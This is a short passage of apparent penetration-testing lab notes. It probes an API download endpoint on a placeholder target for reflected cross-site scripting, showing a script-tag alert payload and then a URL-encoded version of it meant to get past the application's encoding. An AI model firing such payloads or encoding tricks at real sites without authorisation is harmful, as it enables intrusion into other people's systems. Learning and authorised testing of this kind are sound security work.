* Suppose we are having a better look at the API of the previous section, `http://<TARGET IP>:3000/api/download`
* `/api/download/test_value`

![](6.png)

* `test_value` is reflected in the response

```javascript
<script>alert(document.domain)</script>
```

![](9.png)

* It looks like the application is encoding the submitted payload
* We can try URL-encoding our payload once and submitting it again, as follows

```javascript
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

